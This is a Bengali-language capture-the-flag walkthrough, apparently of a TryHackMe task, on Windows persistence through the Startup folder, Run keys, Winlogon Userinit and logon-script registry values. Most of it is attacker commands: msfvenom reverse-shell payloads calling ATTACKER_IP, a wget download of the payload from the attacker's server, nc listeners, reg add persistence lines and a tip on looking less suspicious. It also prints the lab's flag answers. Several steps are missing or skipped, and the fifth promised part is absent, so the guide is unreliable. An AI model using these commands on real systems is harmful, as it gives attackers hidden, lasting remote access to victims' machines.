# 👤 টাস্ক ৬: লগঅন ট্রিগার্ড পার্সিস্টেন্স (Logon Triggered Persistence)

**ধারণা:** ব্যবহারকারী যখন সিস্টেমে লগইন করে, তখন নির্দিষ্ট কিছু অ্যাকশন স্বয়ংক্রিয়ভাবে ট্রিগার হয়। হ্যাকাররা এই ফিচারগুলোকে কাজে লাগিয়ে এমন পেলোড বসাতে পারে যা প্রতিবার লগইনের সময় চালু হবে। এটি পার্সিস্টেন্সের জন্য খুবই নির্ভরযোগ্য একটি পদ্ধতি।

এই টাস্কে পাঁচটি ভিন্ন পদ্ধতি আলোচনা করা হয়েছে:
1.  স্টার্টআপ ফোল্ডার (Startup Folder)
2.  রান / রানওয়ান্স রেজিস্ট্রি (Run / RunOnce Registry)
3.  উইনলগন (Winlogon)
4.  লগঅন স্ক্রিপ্ট (Logon Scripts)
5.  এনভায়রনমেন্ট ভ্যারিয়েবল (Environment Variable)

---

## 📁 পার্ট ১: স্টার্টআপ ফোল্ডার (Startup Folder)

**কৌশল:** উইন্ডোজে নির্দিষ্ট ফোল্ডার আছে যেখানে কোনো ফাইল রাখলে তা ইউজার লগইনের সময় অটোমেটিক চালু হয়। এই ফোল্ডারে পেলোড রেখে পার্সিস্টেন্স তৈরি করা যায়।

### স্টার্টআপ ফোল্ডারের পাথ

| স্কোপ | পাথ | ব্যাখ্যা |
|:---|:---|:---|
| **বর্তমান ইউজার** | `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | শুধু নির্দিষ্ট ইউজারের জন্য কাজ করে |
| **সকল ইউজার** | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` | মেশিনের সকল ইউজারের জন্য কাজ করে |

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4450 -f exe -o revshell.exe` | সাধারণ `.exe` ফরম্যাটে রিভার্স শেল পেলোড তৈরি। |
| ২ | **HTTP সার্ভার চালু (অ্যাটাকার মেশিনে):** | |
| | `python3 -m http.server 8000` | পেলোড ট্রান্সফারের জন্য সহজ HTTP সার্ভার। |
| ৩ | **পেলোড ডাউনলোড (ভিক্টিম মেশিনে):** | |
| | `wget http://<ATTACKER_IP>:8000/revshell.exe -O revshell.exe` | অথবা `certutil` বা `Invoke-WebRequest` ব্যবহার করা যায়। |
| ৪ | **স্টার্টআপ ফোল্ডারে কপি:** | |

| ৫ | **লিসেনার চালু (অ্যাটাকার মেশিনে):** | |
| | `nc -lvp 4450` | পোর্ট ৪৪৫০-এ রিভার্স শেলের জন্য অপেক্ষা। |
| ৬ | **সাইন আউট ও পুনরায় লগইন:** | |
| | Start Menu → Sign out → RDP দিয়ে পুনরায় লগইন | **লক্ষণীয়:** শুধু RDP উইন্ডো বন্ধ করলে সেশন ওপেন থাকে, সাইন আউট করতেই হবে। |
| ৭ | **ফ্ল্যাগ সংগ্রহ:** | |
| | `C:\flags\flag10.exe` রান করো। | **ফ্ল্যাগ ১০:** `THM{NO_NO_AFTER_YOU}` |

## 📝 পার্ট ২: রান / রানওয়ান্স রেজিস্ট্রি (Run / RunOnce Registry)

**কৌশল:** রেজিস্ট্রির নির্দিষ্ট কী-তে পেলোডের পাথ যুক্ত করলে প্রতিবার লগইনের সময় সেটি চালু হবে।

### রেজিস্ট্রি পাথসমূহ

| পাথ | স্কোপ | ফ্রিকোয়েন্সি |
|:---|:---|:---|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | বর্তমান ইউজার | প্রতিবার লগইনে |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | বর্তমান ইউজার | শুধু একবার |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | সকল ইউজার | প্রতিবার লগইনে |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | সকল ইউজার | শুধু একবার |

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4451 -f exe -o revshell.exe` | নতুন পোর্ট ৪৪৫১ ব্যবহার করা হয়েছে। |
| ২ | **পেলোড ট্রান্সফার ও মুভ:** | |
| | `move revshell.exe C:\Windows\` | `C:\Windows\` ফোল্ডারে রাখলে কম সন্দেহজনক দেখায়। |
| ৩ | **রেজিস্ট্রি এডিটর খোলা:** | |
| | `regedit` | অথবা কমান্ড লাইন থেকে: `reg add` |

## 🔐 পার্ট ৩: উইনলগন (Winlogon)

**কৌশল:** Winlogon হলো উইন্ডোজের সেই কম্পোনেন্ট যা ইউজার লগইনের পর প্রোফাইল লোড করে। এর রেজিস্ট্রি কী পরিবর্তন করে নিজস্ব পেলোড অ্যাড করা যায়।

### গুরুত্বপূর্ণ রেজিস্ট্রি কীসমূহ

| কী | ডিফল্ট ভ্যালু | কাজ |
|:---|:---|:---|
| `Userinit` | `C:\Windows\system32\userinit.exe,` | ইউজার প্রোফাইল রিস্টোর করে |
| `shell` | `explorer.exe` | সিস্টেম শেল (ডেস্কটপ) লোড করে |

**লক্ষণীয়:** ভ্যালু পরিবর্তন না করে, কমা (,) দিয়ে আলাদা করে নতুন পেলোড অ্যাড করা যায়। Winlogon সবগুলোকে ক্রমান্বয়ে চালাবে।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4452 -f exe -o revshell.exe` | পোর্ট ৪৪৫২ ব্যবহার। |
| ২ | **পেলোড ট্রান্সফার ও মুভ:** | |
| | `move revshell.exe C:\Windows\` | |
| ৩ | **রেজিস্ট্রি পাথে যাও:** | |
| | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | |
| ৪ | **Userinit ভ্যালু পরিবর্তন:** | |
| | পূর্বের ভ্যালু: `C:\Windows\system32\userinit.exe` | |
| | নতুন ভ্যালু: `C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe` | **লক্ষণীয়:** ফ্ল্যাগ পেতে `Userinit` ব্যবহার করতেই হবে, `shell` নয়। |
| ৫ | **কমান্ড লাইন বিকল্প:** | |
| | `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe" /f` | |
| ৬ | **লিসেনার চালু ও সাইন আউট:** | |
| | `nc -lvp 4452` → সাইন আউট → পুনরায় লগইন | সংযোগ পেতে ১০ সেকেন্ড লাগতে পারে। |
| ৭ | **ফ্ল্যাগ সংগ্রহ:** | |
| | `C:\flags\flag12.exe` রান করো। | **ফ্ল্যাগ ১২:** `THM{I_INSIST_GO_FIRST}` |

## 📜 পার্ট ৪: লগঅন স্ক্রিপ্ট (Logon Scripts)

**কৌশল:** `userinit.exe` লগইনের সময় `UserInitMprLogonScript` নামের একটি এনভায়রনমেন্ট ভ্যারিয়েবল চেক করে। এটি ডিফল্টভাবে সেট করা থাকে না। আমরা এটি সেট করে আমাদের পেলোড চালাতে পারি।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **পেলোড তৈরি (অ্যাটাকার মেশিনে):** | |
| | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4453 -f exe -o revshell.exe` | পোর্ট ৪৪৫৩ ব্যবহার। |
| ২ | **পেলোড ট্রান্সফার ও মুভ:** | |
| | `move revshell.exe C:\Windows\` | |
| ৩ | **রেজিস্ট্রি পাথে যাও:** | |
| | `HKCU\Environment` | **লক্ষণীয়:** এই কী শুধু বর্তমান ইউজারের জন্য কাজ করে। `HKLM`-এ এর কোনো সমতুল্য নেই। |
| ৪ | **নতুন ভ্যালু তৈরি:** | |
| | নাম: `UserInitMprLogonScript` | টাইপ: `REG_EXPAND_SZ` |

| | `reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_EXPAND_SZ /d "C:\Windows\revshell.exe"` | |

| ৭ | **ফ্ল্যাগ সংগ্রহ:** | |
| | `C:\flags\flag13.exe` রান করো। | **ফ্ল্যাগ ১৩:** `THM{USER_TRIGGERED_PERSISTENCE_FTW}` |
